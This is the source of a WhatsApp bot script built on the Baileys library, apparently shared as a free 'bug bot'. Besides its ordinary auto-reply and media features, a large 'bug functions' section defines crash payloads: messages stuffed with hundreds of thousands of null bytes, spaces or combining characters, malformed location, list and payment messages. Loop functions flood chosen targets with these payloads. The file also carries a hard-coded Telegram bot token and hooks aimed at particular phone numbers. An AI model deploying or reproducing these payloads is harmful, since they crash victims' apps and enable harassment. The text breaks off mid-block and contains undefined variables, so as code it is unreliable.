//base by DGXeon (Xeon Bot Inc.)
//re-upload? recode? copy code? give credit ya :)
//YouTube: @DGXeon
//Instagram: unicorn_xeon13
//Telegram: t.me/xeonbotinc
//GitHub: @DGXeon
//WhatsApp: +916909137213
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon

const { default: makeWaSocket, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId : (m.mtype == 'templateButtonreplygcxeonMessage') ? m.message.templateButtonreplygcxeonMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcxeon.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
       
        const isCreator = [botNumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = XeonBotInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || XeonBotInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(XeonBotInc, m, premium);
//group chat msg by xeon
const replygcxeon = (teks) => {
XeonBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcxeon('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGXeon',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}

//bug functions
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./XeonMedia/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./XeonMedia/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🦄드림 가이 Xeon`
}
}
}

const sendReaction = async reactionContent => {
  XeonBotInc.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🦄드림 가이 Xeon",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🦄드림 가이 Xeon"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🦄드림 가이 Xeon"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   XeonBotInc.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    XeonBotInc.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  XeonBotInc.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  XeonBotInc.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const xeonimun = (texto) => {
XeonBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return replygcxeon("Erro..")
})
}

const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Xeon's ur father`
}}
}
async function XeonyCrashy(dgxeon,chat) {
XeonBotInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgxeon}.${xeontext1}` ,
caption: `${dgxeon + xeontext1}`,
}, {quoted: subscribe_dgxeon })
}
//end bug functions

async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!XeonBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            XeonBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        XeonBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        XeonBotInc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        XeonBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        XeonBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            XeonBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}

function pickRandom(list) {
			return list[Math.floor(list.length * Math.random())]
		}
		
//pic sender
if (m.sender.startsWith(`${global.target1}`)){ 
var notnot = JSON.parse(fs.readFileSync('./gali/pic.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { image: hasil }, { quoted: m })
        }
        if (m.sender.startsWith(`${global.target2}`)){ 
var notnot = JSON.parse(fs.readFileSync('./gali/pic.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { image: hasil }, { quoted: m })
        }
        if (m.sender.startsWith(`${global.target3}`)){ 
var notnot = JSON.parse(fs.readFileSync('./gali/pic.json'))
var hasil = pickRandom(notnot)
